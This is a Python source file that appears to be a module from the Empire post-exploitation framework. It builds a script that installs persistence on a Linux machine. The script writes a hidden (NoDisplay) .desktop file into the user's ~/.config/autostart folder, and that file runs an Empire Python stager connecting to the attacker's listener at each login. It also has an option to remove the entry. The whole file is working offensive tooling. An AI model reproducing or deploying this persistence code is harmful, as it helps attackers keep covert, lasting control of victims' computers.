from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        remove = params['Remove']
        file_name = params['FileName']
        listener_name = params['Listener']
        launcher = main_menu.stagers.generate_launcher(listener_name, language='python')
        launcher = launcher.strip('echo').strip(' | python3 &')
        dt_settings = """
[Desktop Entry]
Name=%s
Exec=python -c %s
Type=Application
NoDisplay=True
""" % (file_name, launcher)
        script = """
import subprocess
import sys
import os
remove = "%s"
dtFile = \"\"\"
%s
\"\"\"
home = os.path.expanduser("~")
filePath = home + "/.config/autostart/"
writeFile = filePath + "%s.desktop"

if remove.lower() == "true":
    if os.path.isfile(writeFile):
        os.remove(writeFile)
        print("\\n[+] Persistence has been removed")
    else:
        print("\\n[-] Persistence file does not exist, nothing removed")

else:
    if not os.path.exists(filePath):
        os.makedirs(filePath)
    e = open(writeFile,'wb')
    e.write(dtFile)
    e.close()

    print("\\n[+] Persistence has been installed: ~/.config/autostart/%s")
    print("\\n[+] Empire daemon has been written to %s")

""" % (remove, dt_settings, file_name, file_name, file_name)

        return script
